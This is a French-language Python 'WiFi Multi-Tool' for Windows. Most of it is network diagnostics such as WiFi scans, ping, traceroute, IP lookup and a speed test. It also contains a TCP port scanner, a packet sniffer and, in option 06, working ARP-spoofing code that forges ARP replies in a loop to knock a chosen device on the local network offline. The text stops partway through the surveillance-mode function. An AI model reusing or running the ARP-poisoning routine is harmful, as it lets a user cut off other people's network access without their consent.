#!/usr/bin/env python3
"""
WiFi Multi-Tool v3.5 — By AKO
Windows Edition · Python 3.10+
pip install colorama scapy requests
+ Npcap : https://npcap.com/#download
"""

import subprocess, sys, os, re, socket, csv, time, threading, json
from datetime import datetime
from pathlib import Path

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

try:
    from scapy.all import sniff, ARP, Ether, srp, sendp, get_if_hwaddr, conf as scapy_conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False


# ══════════════════════════════════════════════════════════
#  PALETTE  — Bleu nuit / Cyan / Blanc
# ══════════════════════════════════════════════════════════
PRI  = Fore.CYAN
SEC  = Fore.BLUE
ACC  = Fore.WHITE
DIM  = Fore.LIGHTBLACK_EX
GRN  = Fore.LIGHTGREEN_EX
RED  = Fore.RED
YLW  = Fore.YELLOW
BR   = Style.BRIGHT
RS   = Style.RESET_ALL

def title(t):  return f"\n{BR}{PRI}  ╔{'═'*(len(t)+4)}╗\n  ║  {ACC}{t}{PRI}  ║\n  ╚{'═'*(len(t)+4)}╝{RS}"
def ok(t):     return f"{GRN}  [✓] {t}{RS}"
def err(t):    return f"{RED}  [✗] {t}{RS}"
def warn(t):   return f"{YLW}  [!] {t}{RS}"
def info(t):   return f"{DIM}  [·] {t}{RS}"
def sep():     return f"{DIM}  {'─'*62}{RS}"
def hdr(cols): return f"  {BR}{ACC}{cols}{RS}"

LOG_DIR = Path("wifi_logs")
LOG_DIR.mkdir(exist_ok=True)

CONN_HISTORY = []   # historique connexions/déconnexions
_last_networks = []


# ══════════════════════════════════════════════════════════
#  BANNIÈRE + BOOT
# ══════════════════════════════════════════════════════════
BANNER = f"""
{BR}{PRI}
  ██╗    ██╗██╗███████╗██╗
  ██║    ██║██║██╔════╝██║
  ██║ █╗ ██║██║█████╗  ██║
  ██║███╗██║██║██╔══╝  ██║
  ╚███╔███╔╝██║██║     ██║
   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝{RS}
{DIM}        v3.5  ·  By AKO  ·  Windows Edition{RS}"""

def typewrite(text, delay=0.02):
    for ch in text:
        sys.stdout.write(ch); sys.stdout.flush(); time.sleep(delay)
    print()

def slow_banner():
    os.system("cls" if os.name == "nt" else "clear")
    lines = BANNER.split("\n")
    for line in lines:
        print(line); time.sleep(0.06)
    time.sleep(0.1)
    msgs = ["Chargement des modules reseau...",
            "Detection de l'interface WiFi...",
            "Initialisation...", "Pret."]
    print()
    for m in msgs:
        sys.stdout.write(f"  {DIM}[boot]{RS} ")
        typewrite(m, delay=0.02)
        time.sleep(0.05)
    print()

MENU = f"""
{DIM}  {'═'*62}{RS}
{BR}{PRI}  WIFI MULTI-TOOL{RS} {DIM}· v3.5 · By AKO{RS}
{DIM}  {'═'*62}{RS}

{BR}{PRI}  [ RESEAU ]──────────────────────────────────────────────{RS}
  {ACC}01{RS}{DIM}  Scanner les reseaux WiFi{RS}
  {ACC}02{RS}{DIM}  Infos reseau connecte  (IP · GW · DNS){RS}
  {ACC}03{RS}{DIM}  Historique des reseaux connus{RS}
  {ACC}04{RS}{DIM}  Verifier la securite  (WEP/WPA/WPA2/WPA3){RS}

{BR}{PRI}  [ APPAREILS ]───────────────────────────────────────────{RS}
  {ACC}05{RS}{DIM}  Scanner les appareils + recuperer leur IP{RS}
  {ACC}06{RS}{DIM}  Couper l'acces d'un appareil  (ARP block){RS}
  {ACC}07{RS}{DIM}  Historique connexions/deconnexions{RS}

{BR}{PRI}  [ MESSAGES ]────────────────────────────────────────────{RS}
  {ACC}08{RS}{DIM}  Envoyer un message a un appareil  (TCP){RS}

{BR}{PRI}  [ IP & DIAGNOSTIC ]─────────────────────────────────────{RS}
  {ACC}09{RS}{DIM}  IP Lookup  (infos publiques sur une IP){RS}
  {ACC}10{RS}{DIM}  Ping / test de latence{RS}
  {ACC}11{RS}{DIM}  Test de debit internet{RS}
  {ACC}12{RS}{DIM}  Traceroute{RS}
  {ACC}13{RS}{DIM}  Scanner les ports d'un appareil{RS}
  {ACC}14{RS}{DIM}  Signal WiFi en temps reel{RS}
  {ACC}15{RS}{DIM}  Capturer des paquets{RS}
  {ACC}16{RS}{DIM}  Mode surveillance  (scan en boucle){RS}

{BR}{PRI}  [ CONTROLE ]────────────────────────────────────────────{RS}
  {ACC}17{RS}{DIM}  Allumer le WiFi{RS}
  {ACC}18{RS}{DIM}  Eteindre le WiFi{RS}

{BR}{PRI}  [ EXPORT ]──────────────────────────────────────────────{RS}
  {ACC}19{RS}{DIM}  Exporter le dernier scan  (CSV / TXT){RS}

  {RED}00{RS}{DIM}  Quitter{RS}
{DIM}  {'═'*62}{RS}"""


# ══════════════════════════════════════════════════════════
#  UTILITAIRES
# ══════════════════════════════════════════════════════════
def run(cmd):
    r = subprocess.run(cmd, capture_output=True, text=True,
                       encoding="utf-8", errors="ignore")
    return r.returncode, r.stdout + r.stderr

def get_wifi_iface():
    _, out = run(["netsh", "interface", "show", "interface"])
    for line in out.splitlines():
        if any(k in line for k in ("Wi-Fi","WiFi","Wireless")):
            parts = line.split()
            if parts: return parts[-1]
    return "Wi-Fi"

def get_gateway():
    _, ipcfg = run(["ipconfig"])
    for line in ipcfg.splitlines():
        if re.search(r"Passerelle|Default Gateway", line):
            m = re.search(r"[\d.]+", line.split(":")[-1])
            if m: return m.group()
    return "192.168.1.1"

def pause():
    input(f"\n{DIM}  Appuyez sur Entree pour continuer...{RS}")

def clear_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)


# ══════════════════════════════════════════════════════════
#  01. SCANNER LES RÉSEAUX
# ══════════════════════════════════════════════════════════
def scan_networks(silent=False):
    global _last_networks
    if not silent:
        print(title("SCAN DES RESEAUX WIFI"))
        print(info("Scan en cours..."))

    code, out = run(["netsh", "wlan", "show", "networks", "mode=Bssid"])
    if code != 0:
        if not silent: print(err("Impossible de scanner. WiFi allume ?"))
        return []

    networks, cur = [], {}
    for line in out.splitlines():
        line = line.strip()
        if re.match(r"^SSID\s+\d+", line):
            if cur: networks.append(cur)
            cur = {"ssid": line.split(":",1)[-1].strip()}
        elif "Authentification" in line or "Authentication" in line:
            cur["auth"] = line.split(":",1)[-1].strip()
        elif "Chiffrement" in line or "Cipher" in line:
            cur["cipher"] = line.split(":",1)[-1].strip()
        elif "Signal" in line:
            cur["signal"] = line.split(":",1)[-1].strip()
        elif re.match(r"^\s*BSSID\s+1", line):
            cur["bssid"] = line.split(":",1)[-1].strip()
        elif "Canal" in line or "Channel" in line:
            cur["channel"] = line.split(":",1)[-1].strip()
    if cur: networks.append(cur)
    _last_networks = networks

    if not silent:
        if not networks:
            print(warn("Aucun reseau detecte.")); pause(); return []
        print(f"\n{hdr(f'  #    SSID                         BSSID                Signal    Canal  Auth')}")
        print(sep())
        for i, n in enumerate(networks, 1):
            ssid   = n.get("ssid","?")[:27]
            bssid  = n.get("bssid","?")[:18]
            signal = n.get("signal","?")
            chan   = n.get("channel","?")
            auth   = n.get("auth","?")
            try:
                pct = int(signal.replace("%",""))
                sc  = GRN if pct >= 70 else (YLW if pct >= 40 else RED)
            except: sc = ACC
            print(f"  {DIM}{i:<4}{RS}{ACC}{ssid:<29}{RS}{DIM}{bssid:<20}{RS}"
                  f"{sc}{signal:<10}{RS}{DIM}{chan:<7}{RS}{DIM}{auth}{RS}")
        print(f"\n{ok(str(len(networks)) + ' reseau(x) trouve(s)')}")
        pause()
    return networks


# ══════════════════════════════════════════════════════════
#  02. INFOS RÉSEAU CONNECTÉ
# ══════════════════════════════════════════════════════════
def network_info():
    print(title("INFOS RESEAU CONNECTE"))
    _, ssid_out = run(["netsh", "wlan", "show", "interfaces"])
    ssid = bssid = signal = speed = "?"
    for line in ssid_out.splitlines():
        l = line.strip()
        if l.startswith("SSID") and "BSSID" not in l:
            ssid = l.split(":",1)[-1].strip()
        elif "BSSID" in l:   bssid  = l.split(":",1)[-1].strip()
        elif "Signal" in l:  signal = l.split(":",1)[-1].strip()
        elif any(k in l for k in ("Debit","Receive rate","Vitesse","Rate")):
            speed = l.split(":",1)[-1].strip()

    _, ipcfg = run(["ipconfig", "/all"])
    ip = mask = gw = "?"
    dns_list = []
    in_wifi = False
    for line in ipcfg.splitlines():
        if any(k in line for k in ("Wi-Fi","WiFi","Wireless")): in_wifi = True
        if in_wifi:
            l = line.strip()
            if re.search(r"Adresse IPv4|IPv4 Address", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: ip = m.group()
            elif re.search(r"Masque|Subnet Mask", l):
                mask = l.split(":")[-1].strip()
            elif re.search(r"Passerelle|Default Gateway", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: gw = m.group()
            elif re.search(r"Serveurs DNS|DNS Servers", l):
                m = re.search(r"[\d.]+", l.split(":")[-1])
                if m: dns_list.append(m.group())
            elif dns_list and re.match(r"^\s+[\d.]+", line):
                dns_list.append(line.strip())
            elif line.strip() == "" and in_wifi and ip != "?":
                break

    rows = [
        ("SSID",       ssid),   ("BSSID",    bssid),
        ("Signal",     signal), ("Debit",    speed),
        ("─"*16,       ""),
        ("IP",         ip),     ("Masque",   mask),
        ("Passerelle", gw),
        ("DNS",        " · ".join(dns_list) if dns_list else "?"),
        ("─"*16,       ""),
        ("Hostname",   socket.gethostname()),
    ]
    print()
    for k, v in rows:
        if k.startswith("─"): print(f"  {DIM}{k}{RS}")
        else: print(f"  {PRI}{k:<18}{RS}{ACC}{v}{RS}")
    pause()


# ══════════════════════════════════════════════════════════
#  03. HISTORIQUE RÉSEAUX CONNUS
# ══════════════════════════════════════════════════════════
def known_networks():
    print(title("HISTORIQUE DES RESEAUX CONNUS"))
    _, out = run(["netsh", "wlan", "show", "profiles"])
    profiles = re.findall(r"(?:Profil\s+\w+|All User Profile)\s*:\s*(.+)", out)
    if not profiles:
        print(warn("Aucun profil trouve.")); pause(); return
    print(f"\n{hdr('  #    SSID                                Auth')}")
    print(sep())
    for i, name in enumerate(profiles, 1):
        name = name.strip()
        _, detail = run(["netsh", "wlan", "show", "profile", f"name={name}"])
        auth = "?"
        for line in detail.splitlines():
            if "Authentification" in line or "Authentication" in line:
                auth = line.split(":",1)[-1].strip(); break
        print(f"  {DIM}{i:<4}{RS}{ACC}{name:<38}{RS}{DIM}{auth}{RS}")
    print(f"\n{ok(str(len(profiles)) + ' profil(s)')}")
    pause()


# ══════════════════════════════════════════════════════════
#  04. VÉRIFICATION SÉCURITÉ
# ══════════════════════════════════════════════════════════
SECURITY_LEVELS = {
    "WEP":   (RED, "FAIBLE    — Cassable en minutes"),
    "WPA2":  (GRN, "BON       — Suffisant pour usage courant"),
    "WPA3":  (GRN, "EXCELLENT — Derniere generation"),
    "WPA":   (YLW, "MOYEN     — Vulnerable dictionnaire"),
    "Ouvert":(RED, "AUCUN     — Reseau non chiffre !"),
    "Open":  (RED, "AUCUN     — Reseau non chiffre !"),
}

def check_security():
    print(title("SECURITE DES RESEAUX"))
    print(info("Scan en cours..."))
    networks = scan_networks(silent=True)
    if not networks:
        print(err("Aucun reseau.")); pause(); return
    print(f"\n{hdr('  SSID                         Auth        Evaluation')}")
    print(sep())
    for n in networks:
        ssid = n.get("ssid","?")[:27]
        auth = n.get("auth","?")
        color, label = ACC, "INCONNU"
        for key, (col, lbl) in SECURITY_LEVELS.items():
            if key.lower() in auth.lower():
                color, label = col, lbl; break
        print(f"  {ACC}{ssid:<29}{RS}{DIM}{auth:<12}{RS}{color}{label}{RS}")
    print(f"\n{ok('Analyse terminee')}")
    pause()


# ══════════════════════════════════════════════════════════
#  05. ARP SCAN — APPAREILS + IP
# ══════════════════════════════════════════════════════════
def arp_scan(silent=False):
    if not silent:
        print(title("APPAREILS CONNECTES + IP"))

    if not SCAPY_OK:
        if not silent:
            print(err("Scapy requis : pip install scapy + Npcap"))
            pause()
        return []

    _, ipcfg = run(["ipconfig"])
    subnet = "192.168.1.0/24"
    in_wifi = False
    for line in ipcfg.splitlines():
        if any(k in line for k in ("Wi-Fi","Wireless")): in_wifi = True
        if in_wifi:
            m = re.search(r"(192\.168\.\d+|10\.\d+\.\d+|172\.\d+\.\d+)\.\d+", line)
            if m: subnet = m.group(1) + ".0/24"; break

    if not silent:
        print(info(f"Scan du subnet {subnet}..."))
        print(warn("Patientez 5-15 secondes...\n"))

    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                     timeout=3, verbose=0)
        devices = []
        for _, rcv in ans:
            ip_a = rcv.psrc; mac = rcv.hwsrc
            try:    host = socket.gethostbyaddr(ip_a)[0]
            except: host = "inconnu"
            devices.append({"ip": ip_a, "mac": mac, "host": host})

        if not silent:
            if not devices:
                print(warn("Aucun appareil. Lancez en Admin.")); pause(); return []
            print(f"{hdr('  #    IP                 MAC                  Nom hote')}")
            print(sep())
            for i, d in enumerate(sorted(devices, key=lambda x: x["ip"]), 1):
                print(f"  {DIM}{i:<4}{RS}{PRI}{d['ip']:<19}{RS}{DIM}{d['mac']:<21}{RS}{ACC}{d['host']}{RS}")
            print(f"\n{ok(str(len(devices)) + ' appareil(s) detecte(s)')}")
            pause()
        return devices

    except PermissionError:
        if not silent: print(err("Lancez en Administrateur."))
    except Exception as e:
        if not silent: print(err(f"Erreur : {e}"))
    return []


# ══════════════════════════════════════════════════════════
#  06. ARP BLOCK + DÉTECTION DÉCONNEXION
# ══════════════════════════════════════════════════════════
def arp_block():
    print(title("COUPER L'ACCES D'UN APPAREIL"))
    print(warn("A utiliser uniquement sur TON reseau et TES appareils."))

    if not SCAPY_OK:
        print(err("Scapy requis : pip install scapy + Npcap")); pause(); return

    devices = []
    while True:
        print(info("Scan en cours..."))
        devices = arp_scan(silent=True)
        if not devices:
            print(err("Aucun appareil. Lancez en Admin.")); pause(); return

        print(f"\n{hdr('  #    IP                 MAC                  Nom hote')}")
        print(sep())
        for i, d in enumerate(devices, 1):
            print(f"  {ACC}{i:<4}{RS}{PRI}{d['ip']:<19}{RS}{DIM}{d['mac']:<21}{RS}{ACC}{d['host']}{RS}")

        print(f"\n  {DIM}[r] Rescanner  |  [0] Annuler  |  Numero pour bloquer{RS}\n")
        choice = input(f"  {ACC}Votre choix : {RS}").strip().lower()

        if choice == "0": return
        if choice == "r":
            print(); continue
        if not choice.isdigit():
            print(warn("Choix invalide.")); continue
        idx = int(choice) - 1
        if idx < 0 or idx >= len(devices):
            print(err("Numero invalide.")); continue
        break

    target = devices[idx]
    t_ip   = target["ip"]; t_mac = target["mac"]; t_host = target["host"]
    gw_ip  = get_gateway()

    print(info(f"Resolution MAC passerelle {gw_ip}..."))
    gw_mac = "ff:ff:ff:ff:ff:ff"
    try:
        gw_ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                         timeout=3, verbose=0, retry=2)
        if gw_ans:
            gw_mac = gw_ans[0][1].hwsrc
            print(ok(f"Passerelle : {gw_ip}  ->  {gw_mac}"))
        else:
            print(warn("MAC passerelle non resolue, broadcast utilise."))
    except Exception as e:
        print(warn(f"ARP passerelle echoue ({e})."))

    try:    my_mac = get_if_hwaddr(scapy_conf.iface)
    except: my_mac = "ff:ff:ff:ff:ff:ff"

    dur_raw  = input(f"  {ACC}Duree en secondes [{DIM}30{ACC}] : {RS}").strip()
    duration = int(dur_raw) if dur_raw.isdigit() else 30

    print(f"\n{warn(f'Blocage de {t_ip} ({t_host}) pendant {duration}s...')}")
    print(info("Ctrl+C pour arreter.\n"))

    stop_event = threading.Event()

    def is_online(ip):
        code, _ = run(["ping", "-n", "1", "-w", "800", ip])
        return code == 0

    def block_loop():
        pkt_target = (Ether(src=my_mac, dst=t_mac) /
                      ARP(op=2, hwsrc=my_mac, psrc=gw_ip, hwdst=t_mac, pdst=t_ip))
        pkt_gw     = (Ether(src=my_mac, dst=gw_mac) /
                      ARP(op=2, hwsrc=my_mac, psrc=t_ip, hwdst=gw_mac, pdst=gw_ip))

        end = time.time() + duration
        sent = 0
        was_online = True
        check_every = 15   # vérifier toutes les 15 salves (~3s)

        while not stop_event.is_set() and time.time() < end:
            try:
                for _ in range(10):
                    sendp(pkt_target, verbose=0)
                    sendp(pkt_gw,     verbose=0)
                    sent += 1

                if sent % check_every == 0:
                    online = is_online(t_ip)
                    ts = datetime.now().strftime("%H:%M:%S")
                    if was_online and not online:
                        print(f"\n{GRN}  [✓] [{ts}] Appareil DECONNECTE ! ({sent*2} paquets envoyes){RS}")
                        CONN_HISTORY.append({
                            "time": ts, "ip": t_ip, "host": t_host, "event": "deconnecte"
                        })
                        was_online = False
                    elif not was_online and online:
                        print(f"\n{YLW}  [!] [{ts}] Appareil RECONNECTE ! Reprise du blocage...{RS}")
                        CONN_HISTORY.append({
                            "time": ts, "ip": t_ip, "host": t_host, "event": "reconnecte"
                        })
                        was_online = True

                status = f"{RED}en ligne{RS}" if was_online else f"{GRN}deconnecte{RS}"
                sys.stdout.write(
                    f"\r  {DIM}Paquets : {sent*2:<6} | Statut : {RS}{status}   "
                )
                sys.stdout.flush()
                time.sleep(0.05)
            except Exception:
                break
        print()

    t = threading.Thread(target=block_loop)
    t.start()
    try:
        t.join()
    except KeyboardInterrupt:
        stop_event.set(); t.join()

    print(ok(f"Blocage termine pour {t_ip}"))
    pause()


# ══════════════════════════════════════════════════════════
#  07. HISTORIQUE CONNEXIONS / DÉCONNEXIONS
# ══════════════════════════════════════════════════════════
def conn_history():
    print(title("HISTORIQUE CONNEXIONS / DECONNEXIONS"))
    if not CONN_HISTORY:
        print(warn("Aucun evenement enregistre. Utilisez d'abord l'option 06.")); pause(); return
    print(f"\n{hdr('  Heure     IP                 Hote                 Evenement')}")
    print(sep())
    for e in CONN_HISTORY:
        color = GRN if e["event"] == "deconnecte" else YLW
        print(f"  {DIM}{e['time']:<10}{RS}{PRI}{e['ip']:<19}{RS}"
              f"{ACC}{e['host']:<21}{RS}{color}{e['event']}{RS}")
    pause()


# ══════════════════════════════════════════════════════════
#  08. ENVOYER UN MESSAGE (TCP)
# ══════════════════════════════════════════════════════════
MSG_PORT = 55500

def send_message():
    print(title("ENVOYER UN MESSAGE"))
    print(info(f"Les deux appareils doivent etre sur le meme reseau."))
    print(info(f"Le destinataire lance ce script -> option 08 -> mode ecoute.\n"))

    mode = input(f"  {ACC}[e] Envoyer  |  [r] Recevoir : {RS}").strip().lower()

    if mode == "r":
        print(f"\n{ok(f'Ecoute sur le port {MSG_PORT}... (Ctrl+C pour arreter)')}\n")
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", MSG_PORT)); srv.listen(5)
            while True:
                conn, addr = srv.accept()
                data = conn.recv(4096).decode("utf-8", errors="ignore")
                ts   = datetime.now().strftime("%H:%M:%S")
                print(f"  {DIM}[{ts}]{RS} {PRI}De {addr[0]}{RS} : {ACC}{data}{RS}")
                conn.close()
        except KeyboardInterrupt:
            print(f"\n{info('Ecoute arretee.')}")
        except Exception as e:
            print(err(f"Erreur : {e}"))
    else:
        ip_dest = input(f"  {ACC}IP destinataire : {RS}").strip()
        msg     = input(f"  {ACC}Message : {RS}").strip()
        if not ip_dest or not msg:
            print(err("IP ou message vide.")); pause(); return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5); s.connect((ip_dest, MSG_PORT))
            s.sendall(msg.encode("utf-8")); s.close()
            print(ok(f"Message envoye a {ip_dest}"))
        except ConnectionRefusedError:
            print(err("Connexion refusee. L'appareil ecoute-t-il ?"))
        except socket.timeout:
            print(err("Timeout — appareil inaccessible."))
        except Exception as e:
            print(err(f"Erreur : {e}"))
    pause()


# ══════════════════════════════════════════════════════════
#  09. IP LOOKUP
# ══════════════════════════════════════════════════════════
def ip_lookup():
    print(title("IP LOOKUP"))
    print(info("Recupere les infos publiques d'une adresse IP.\n"))

    ip_input = input(f"  {ACC}Entrez une IP (laisser vide = votre IP publique) : {RS}").strip()

    if not REQUESTS_OK:
        print(err("Module 'requests' requis : pip install requests")); pause(); return

    target = ip_input if ip_input else ""
    url    = f"http://ip-api.com/json/{target}?fields=status,message,country,regionName,city,isp,org,as,query,lat,lon,timezone"

    print(info("Requete en cours..."))
    try:
        r    = requests.get(url, timeout=8)
        data = r.json()

        if data.get("status") != "success":
            print(err(f"Echec : {data.get('message','erreur inconnue')}")); pause(); return

        rows = [
            ("IP",          data.get("query",      "?")),
            ("Pays",        data.get("country",    "?")),
            ("Region",      data.get("regionName", "?")),
            ("Ville",       data.get("city",       "?")),
            ("Timezone",    data.get("timezone",   "?")),
            ("─"*16,        ""),
            ("FAI",         data.get("isp",        "?")),
            ("Organisation",data.get("org",        "?")),
            ("AS",          data.get("as",         "?")),
            ("─"*16,        ""),
            ("Latitude",    str(data.get("lat",    "?"))),
            ("Longitude",   str(data.get("lon",    "?"))),
        ]
        print()
        for k, v in rows:
            if k.startswith("─"): print(f"  {DIM}{k}{RS}")
            else: print(f"  {PRI}{k:<18}{RS}{ACC}{v}{RS}")

    except requests.exceptions.ConnectionError:
        print(err("Pas de connexion internet."))
    except Exception as e:
        print(err(f"Erreur : {e}"))
    pause()


# ══════════════════════════════════════════════════════════
#  10. PING
# ══════════════════════════════════════════════════════════
def ping_test():
    print(title("PING / TEST DE LATENCE"))
    raw = input(f"\n  {ACC}Hotes (virgule) [{DIM}8.8.8.8, google.com{ACC}] : {RS}").strip()
    targets = [t.strip() for t in raw.split(",")] if raw else ["8.8.8.8","google.com","1.1.1.1"]
    cnt = input(f"  {ACC}Pings par hote [{DIM}4{ACC}] : {RS}").strip()
    count = int(cnt) if cnt.isdigit() else 4
    print()
    for host in targets:
        print(f"  {PRI}>> {host}{RS}")
        _, out = run(["ping", "-n", str(count), host])
        m = re.search(r"Minimum\s*=\s*(\d+)ms.*Moyen\s*=\s*(\d+)ms.*Maximum\s*=\s*(\d+)ms", out)
        if not m:
            m = re.search(r"Minimum = (\d+)ms, Maximum = (\d+)ms, Average = (\d+)ms", out)
        loss_m = re.search(r"(\d+)%\s*(?:perte|loss)", out, re.IGNORECASE)
        loss   = int(loss_m.group(1)) if loss_m else 100
        lc     = GRN if loss == 0 else (YLW if loss < 50 else RED)
        if m:
            mn, avg, mx = m.group(1), m.group(2), m.group(3)
            print(f"    {DIM}Min:{RS}{GRN}{mn}ms{RS}  {DIM}Moy:{RS}{GRN}{avg}ms{RS}  "
                  f"{DIM}Max:{RS}{GRN}{mx}ms{RS}  {DIM}Perte:{RS}{lc}{loss}%{RS}")
        else:
            print(f"    {RED}Inaccessible / timeout{RS}")
        print()
    pause()


# ══════════════════════════════════════════════════════════
#  11. TEST DE DÉBIT
# ══════════════════════════════════════════════════════════
def speed_test():
    print(title("TEST DE DEBIT INTERNET"))
    if not REQUESTS_OK:
        print(err("pip install requests")); pause(); return
    TEST_URLS = [
        ("Cloudflare 10MB", "https://speed.cloudflare.com/__down?bytes=10000000"),
        ("Google",          "https://www.google.com/images/phd/px.gif"),
    ]
    print(info("Test en cours...\n"))
    for label, url in TEST_URLS:
        try:
            start = time.time()
            r = requests.get(url, timeout=15, stream=True)
            total = sum(len(c) for c in r.iter_content(chunk_size=8192))
            elapsed = time.time() - start
            if elapsed > 0:
                mbps = (total * 8) / (elapsed * 1_000_000)
                sc = GRN if mbps > 20 else (YLW if mbps > 5 else RED)
                print(f"  {DIM}{label:<20}{RS} {sc}{mbps:.2f} Mbps{RS}"
                      f"  {DIM}({total//1024}KB en {elapsed:.1f}s){RS}")
        except Exception as e:
            print(f"  {DIM}{label:<20}{RS} {RED}Erreur : {e}{RS}")
    print(f"\n{ok('Test termine')}")
    pause()


# ══════════════════════════════════════════════════════════
#  12. TRACEROUTE
# ══════════════════════════════════════════════════════════
def traceroute():
    print(title("TRACEROUTE"))
    host = input(f"\n  {ACC}Cible [{DIM}google.com{ACC}] : {RS}").strip() or "google.com"
    print(info(f"Traceroute vers {host}...\n"))
    _, out = run(["tracert", "-d", "-h", "20", host])
    print(f"\n{hdr('  Hop    Latence       IP')}")
    print(sep())
    for line in out.splitlines():
        m = re.match(r"\s*(\d+)\s+([\d.<>*\s]+ms.*?|[\*\s]+)([\d.]+|Request timed out.*)?", line)
        if m:
            hop = m.group(1)
            lat = line.split()[1:4]
            ip  = line.split()[-1] if line.split() else "?"
            lat_str = "  ".join(lat)
            print(f"  {PRI}{hop:<6}{RS}{DIM}{lat_str:<20}{RS}{ACC}{ip}{RS}")
    print(f"\n{ok('Traceroute termine')}")
    pause()


# ══════════════════════════════════════════════════════════
#  13. SCANNER LES PORTS
# ══════════════════════════════════════════════════════════
COMMON_PORTS = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
    80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
    3306:"MySQL", 3389:"RDP", 5900:"VNC", 8080:"HTTP-Alt", 8443:"HTTPS-Alt"
}

def port_scan():
    print(title("SCANNER LES PORTS"))
    host = input(f"\n  {ACC}IP ou hote cible : {RS}").strip()
    if not host:
        print(err("IP requise.")); pause(); return

    mode = input(f"  {ACC}[r] Ports rapides (communs)  |  [c] Personnalise : {RS}").strip().lower()

    if mode == "c":
        port_raw = input(f"  {ACC}Plage de ports (ex: 1-1024) : {RS}").strip()
        try:
            start_p, end_p = map(int, port_raw.split("-"))
        except:
            start_p, end_p = 1, 1024
        ports = range(start_p, end_p + 1)
    else:
        ports = list(COMMON_PORTS.keys())

    print(info(f"Scan de {len(ports)} port(s) sur {host}...\n"))
    print(f"{hdr('  Port    Service          Statut')}")
    print(sep())

    open_count = 0
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((host, port))
            s.close()
            if result == 0:
                service = COMMON_PORTS.get(port, "inconnu")
                print(f"  {PRI}{port:<8}{RS}{DIM}{service:<17}{RS}{GRN}OUVERT{RS}")
                open_count += 1
        except Exception:
            pass

    print(f"\n{ok(str(open_count) + ' port(s) ouvert(s) detecte(s)')}")
    pause()


# ══════════════════════════════════════════════════════════
#  14. SIGNAL EN TEMPS RÉEL
# ══════════════════════════════════════════════════════════
def signal_monitor():
    print(title("SIGNAL WIFI EN TEMPS REEL"))
    print(info("Ctrl+C pour arreter.\n"))

    def get_signal():
        _, out = run(["netsh", "wlan", "show", "interfaces"])
        for line in out.splitlines():
            if "Signal" in line:
                m = re.search(r"(\d+)%", line)
                if m: return int(m.group(1))
        return None

    def bar(pct):
        filled = int(pct / 5)
        color  = GRN if pct >= 70 else (YLW if pct >= 40 else RED)
        return f"{color}{'█' * filled}{'░' * (20 - filled)}{RS} {color}{pct}%{RS}"

    try:
        while True:
            sig = get_signal()
            ts  = datetime.now().strftime("%H:%M:%S")
            if sig is not None:
                sys.stdout.write(f"\r  {DIM}[{ts}]{RS}  {bar(sig)}   ")
                sys.stdout.flush()
            else:
                sys.stdout.write(f"\r  {RED}Signal non disponible{RS}   ")
                sys.stdout.flush()
            time.sleep(1.5)
    except KeyboardInterrupt:
        print(f"\n\n{info('Surveillance arretee.')}")
    pause()


# ══════════════════════════════════════════════════════════
#  15. CAPTURE DE PAQUETS
# ══════════════════════════════════════════════════════════
def capture_packets():
    print(title("CAPTURE DE PAQUETS"))
    if not SCAPY_OK:
        print(err("Scapy requis : pip install scapy + Npcap")); pause(); return
    n_raw = input(f"\n  {ACC}Nombre de paquets [{DIM}30{ACC}] : {RS}").strip()
    count = int(n_raw) if n_raw.isdigit() else 30
    print(f"\n{info(f'Capture de {count} paquets... (Ctrl+C pour stopper)')}\n")
    captured = []
    def handle(pkt):
        ts = datetime.now().strftime("%H:%M:%S")
        s  = pkt.summary()[:72]
        captured.append({"time": ts, "summary": s})
        pc = PRI if "TCP" in s else (YLW if "UDP" in s else DIM)
        print(f"  {DIM}[{ts}]{RS} {pc}{s}{RS}")
    try:
        sniff(prn=handle, count=count, store=False)
    except PermissionError:
        print(err("Lancez en Administrateur."))
    except Exception as e:
        print(err(f"Erreur : {e}"))
    print(f"\n{ok(str(len(captured)) + ' paquet(s) captures')}")
    if captured:
        sv = input(f"  {ACC}Sauvegarder ? [o/N] : {RS}").strip().lower()
        if sv == "o":
            fname = LOG_DIR / f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(fname, "w", encoding="utf-8") as f:
                for p in captured:
                    f.write(f"[{p['time']}] {p['summary']}\n")
            print(ok(f"Sauvegarde -> {fname}"))
    pause()


# ══════════════════════════════════════════════════════════
#  16. MODE SURVEILLANCE
# ══════════════════════════════════════════════════════════
def surveillance_mode():
    print(title("MODE SURVEILLANCE"))
    interval_raw = input(f"\n  {ACC}Intervalle en secondes [{DIM}15{ACC}] : {RS}").strip()
    interval = int(interval_raw) if interval_raw.isdigit() else 15
    print(f"\n{ok(f'Surveillance lancee (toutes les {interval}s) — Ctrl+C pour arreter')}\n")
    known_ssids = set()
    cycle = 0
    try:
        while True:
            cycle += 1
            ts   = datetime.now().strftime("%H:%M:%S")
            nets = scan_networks(silent=True)
            cur  = {n.get("ssid","") for n in nets}
            new  = cur - known_ssids
            gone = known_ssids - cur if known_ssids else set()
            sys.stdout.write(f"\r  {DIM}[{ts}] Cycle {cycle} — {len(nets)} reseau(x){RS}   ")
            sys.stdout.flush()
            if new:
                print(f"\n{warn('NOUVEAU(X) :')}")
                for s in new: print(f"  {GRN}+ {s}{RS}")
            if gone:
                print(f"\n{info('Disparu(s) :')}")
                for s in gone: print(f"  {DIM}- {s}{RS}")
            known_ssids = cur
